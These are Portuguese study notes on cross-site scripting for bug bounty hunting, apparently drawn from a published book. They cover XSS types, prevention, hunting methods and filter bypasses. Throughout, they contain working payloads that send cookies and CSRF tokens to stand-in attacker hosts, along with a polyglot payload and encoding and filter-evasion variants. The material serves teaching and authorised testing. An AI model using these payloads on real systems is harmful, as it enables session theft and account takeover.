livro do bugbounty - vulnerabilidades

# XSS

bom imagina que é possivel usar um inline script em html para acessar a pagina de subscrição de newsletter

**ex de reflected XSS:**

o user recebe um phishing com a seguinte URL:

**https://subscribe.example.com?email=&lt;script&gt;location="http://attacker.com";&lt;/script&gt;**

com isso o user vai ser redirecionado ao site do atacante, que rouba todos os cookies dele usando o seguinte script:

**&lt;script&gt;image = new Image(); image.src='http://attacker\_server\_ip/?c='+document.cookie;&lt;/script&gt;**

## **Stored XSS**

**de alguma forma atacantes conseguem colocar o script dentro do servidor de aplicação, e sempre que o user acessa, o script é ativado -- é o mais perigoso dos XSS, pois afeta usuarios sem que eles saibam.**

&lt;h2&gt;Vickie's message&lt;/h2&gt;

&lt;p&gt;What a great post! Thanks for sharing.&lt;/p&gt;

&lt;h2&gt;Attacker's message&lt;/h2&gt;

&lt;p&gt;&lt;script&gt;alert('XSS by Vickie');&lt;/script&gt;&lt;/p&gt;

## Blind XSS

digamos que vc coloque o script em uma pagina de suporte, e com isso qualquer admin consegue ler a mensagem. É bastante utilizado para atacar administradores, roubar seus dados e suas contas.

## Reflected XSS

a aplicacao pega o input do user, processa no servidor e retorna via HTTP response

## DOM-Based XSS

é parecido com reflected, porem nunca sai do browser do user. É processado pelo proprio user.

livrarias como JQuery são suscetiveis esse tipo de ataque, pois elas dinamicamente alteram os DOMs.

ex:

https://example.com?locale=north+america

&lt;h2&gt;Welcome, user from north america!&lt;/h2&gt;

https://example.com?locale=

&lt;script&gt;location='http://attacker\_server\_ip/?c='+document.cookie;&lt;/script&gt;

pode ser isso tb:

https://example.com#about_us

https://portswigger.net/web-security/cross-site-scripting/dom-based/

## SELF-XSS

é mais uma forma de social engineering que xss (nao é aceito em bug bounty)

## Previnindo XSS

input validation and contextual output escaping and encoding. Aplicacoes não deveriam inserir user-submitted data diretamente em um documento HTML, incluoindo por ex inside &lt;script&gt; tags, HTML tag names, ou attribute names. O servidor que deve validar que o que o usuario mandou nao contem nenhum caracter perigoso por ex &lt;script&gt; -- com isso o servidor poderia bloquear a requisicao ou sanitize removendo ou escaping qualquer caracter especial do request.

escaping é a pratica de encodar caracteres especiais para processamento futuro. Assim eles são interpretados literalmentem, por ex o <> é &lt e &gt. O legal de frameworks como React, Angular 2+ e Vue.js fazem isso automaticamente, previnindo vulns.

Para o DOM-XSS aplicacoes devem evitar codigo que reescreve documentos HTML baseados em input de usuário. E deve-se implementar client-side input validation.

httpOnly flag, prevem que cookies sejam roubados via XSS.

Content-Security-Policy HTTP response header. Restringe recursos como Js, CSS, ou imagens carregam na pagina. Da tambem para pedir para o browser acessar apenas os codigos de Js necessarios da aplicacao.

[https://cheatsheetseries.owasp.org/cheatsheets/Cross\_Site\_Scripting\_Prevention\_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## Hunting for XSS

da pra procurar isso em outros protocolos tb como dns, snmp e smtp (lembra de email)

https://www.offensive-security.com/awae-oswe/

### **procure por user input:**

blog post, IDs, url parameters, pathnames. etc e tenta usar um script alert.

### **insert payload:**

**&lt;script&gt;alert('XSS legal');&lt;/script&gt; **payloads desse tipo não vão funcionar em sites novos, mas ainda funcionarão em IoT ou embedded apps. **&lt;img onload=alert('The image has been loaded!') src="example.png"&gt;** tente mudar HTML tags, nesse exemplo o script so roda quando o HTML rodou. Outra maneira é URL schemes tipo **javascript:** e **data:&lt;/strong&gt; o javascript permite rodar js dentro de uma URL ex \*\*javascript:alert('XSS by Vickie'). \*\*outra usando data \*\*data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+" -> \*\*embed js code em base64, bastante usado para bypass use aqui: [https://example.com/upload\_profile\_pic?url=IMAGE_URL](https://example.com/upload_profile_pic?url=IMAGE_URL) saiba mais em : **https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/****

**Closing tags**

**&lt;img src="USER_INPUT"&gt;** vc teria que usar **"/>&lt;script&gt;location="http://attacker.com";&lt;/script&gt;**

|     |     |
| --- | --- |
| Payload | Purpose |
| &lt;script&gt;alert(1)&lt;/script&gt; | mais comum, gera uma box |
| &lt;iframe src=javascript:alert(1)&gt; | load em Js dentro de um Iframe, usado quando o &lt;script&gt; eh banido pelo filtro xss |
| &lt;body onload=alert(1)&gt; | util quando a input string nao pode conter o termo script. da insert em um elemento HTML que roda Js automaticamente ao dar load. |
| ">&lt;img src=x onerror=prompt(1);&gt; | da close na tag anterior e injeta uma &lt;img&gt; com uma URL invalida. Quando a tag falha, ela roda JS especificada no onerror atribute. |
| &lt;script&gt;alert(1)<!– | <!\- eh o começo de uma comentario HTML, ele comenta o documento HTML para previnir erros de syntaxe. |
| &lt;a onmouseover"alert(1)"&gt;test&lt;/a&gt; | insere um link que vai causar o JS de executar depois do usuario passar o cursor sobre o link |
| &lt;script src=//attacker.com/test.js&gt; | faz com que o browser carregue e rode um script externo no site do hacker. |

e pra quem quer falar multiplas linguas:

https://polyglot.innerht.ml/

javascript:"/*\\"/*`/*' /*&lt;/template&gt;

&lt;/textarea&gt;&lt;/noembed&gt;&lt;/noscript&gt;&lt;/title&gt;

&lt;/style&gt;&lt;/script&gt;--><svg onload=/*<html/*/onmouseover=alert()//>

outra forma e verificar como que o browser roda certos simbolos: >'<"//:=;!--.

pra testar **BLIND xss** eh nessessario passar o alerta pro seu servidor e verificar nas logs se o user acessa ele

&lt;script src='http://YOUR\_SERVER\_IP/xss'&gt;&lt;/script&gt;

https://xsshunter.com/features

## Bypassing XSS Protection

### sintaxe alternativa de JS

ao invez de tentar fechar o 

**&lt;img src="USER_INPUT"&gt;**

assim:

**&lt;img src="/&gt;&lt;script&gt;alert('XSS by Vickie');&lt;/script&gt;"/>**

vc especificaria direto na tag HTML:

**&lt;img src="123" onerror="alert('XSS by Vickie');"/&gt;**

outra forma de injetar codigo

**&lt;a href="javascript:alert('XSS by Vickie')&gt;Click me!&lt;/a&gt;"**

### Capitalization and Encoding

isso aqui ainda funciona em browsers:

**&lt;scrIPT&gt;location='http://attacker\_server\_ip/c='+document.cookie;&lt;/scrIPT&gt;**

da pra usar encoding como abaixo para encriptar a mensagem em ASCII

**String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107,**

**101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)**

isso eh o mesmo que: **"http://attacker\_server\_ip/?c="**

com isso da pra criar XSS sem quotes:

**&lt;scrIPT&gt;location=String.fromCharCode(104, 116, 116, 112, 58, 47,**

**47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,**

**101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;&lt;/scrIPT&gt;**

da pra usar o **https://js.do/**

`<script>`

`function ascii(c){`

`  return c.charCodeAt();`

`}`

`encoded = "INPUT_STRING".split("").map(ascii);`

`document.write(encoded);`

`</script>`

trocando o encoded por encoded = "http://attacker\_server\_ip/?c=".split("").map(ascii);

This JavaScript code should print out "104, 116, 116, 112, 58, 47, 47,

97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95,

105, 112, 47, 63, 99, 61". You can then use it to construct your payload by

using the fromCharCode() method.

### Filter logic errors:

**&lt;scrip<script&gt;t>**

**location='http://attacker\_server\_ip/c='+document.cookie;**

**&lt;/scrip</script&gt;t>**

aqui o script sera quebrado e produzira um script perfeito:

&lt;script&gt;location='http://attacker\_server\_ip/c='+document.cookie;&lt;/script&gt;

**https://owasp.org/www-community/xss-filter-evasion-cheatsheet**

ou google xss filter bypass

Escalando o ataque:

pense que o XSS STORED pode ser usado para roubar conta de ADM e assim podendo ser usado pra roubar API, paginas de login e até mesmo ser escalado para um RCE com upload de algo.

**var token = document.getElementsById('csrf-token')\[0\];**

**var xhr = new XMLHttpRequest();**

**xhr.open("GET", "http://attacker\_server\_ip/?token="+token, true);**

**xhr.send(null);**

# Finding Your First XSS!

Jump right into hunting for your first XSS! Choose a target and follow the

steps we covered in this chapter:

1\. Look for user input opportunities on the application. When user input

is stored and used to construct a web page later, test the input field for

stored XSS. If user input in a URL gets reflected back on the resulting

web page, test for reflected and DOM XSS.

2\. Insert XSS payloads into the user input fields you’ve found. Insert pay-

loads from lists online, a polyglot payload, or a generic test string.

3\. Confirm the impact of the payload by checking whether your browser

runs your JavaScript code. Or in the case of a blind XSS, see if you can

make the victim browser generate a request to your server.

4\. If you can’t get any payloads to execute, try bypassing XSS protections.

5\. Automate the XSS hunting process with techniques introduced in

Chapter 25.

6\. Consider the impact of the XSS you’ve found: who does it target? How

many users can it affect? And what can you achieve with it? Can you

escalate the attack by using what you’ve found?

7\. Send your first XSS report to a bug bounty program!